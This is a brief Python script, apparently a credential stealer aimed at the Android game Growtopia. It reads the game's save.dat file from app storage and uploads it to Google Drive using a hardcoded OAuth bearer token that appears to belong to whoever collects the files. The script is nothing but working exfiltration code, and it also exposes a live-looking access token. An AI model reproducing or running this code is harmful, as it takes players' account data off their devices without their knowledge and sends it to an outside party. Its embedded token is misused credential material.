import json
import requests
def fucxy():
    headers = {"Authorization": "Bearer ya29.a0AfH6SMDjm5FN-zdShQ4rDVg-Ixw5FC7XfkuUdhqx3iG296meko4CjLdd-qmL7DRSlOB4VND4ZyCKN64T3esJxy5vyzIg3l2kMw-tau4aPlKt9q_OzVSsDlLK33LhWWM0RvkDIbB0uoPg6iQ1h1wGxVoJfqpk"}
    para = {
        "name": "saved.dat",
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )


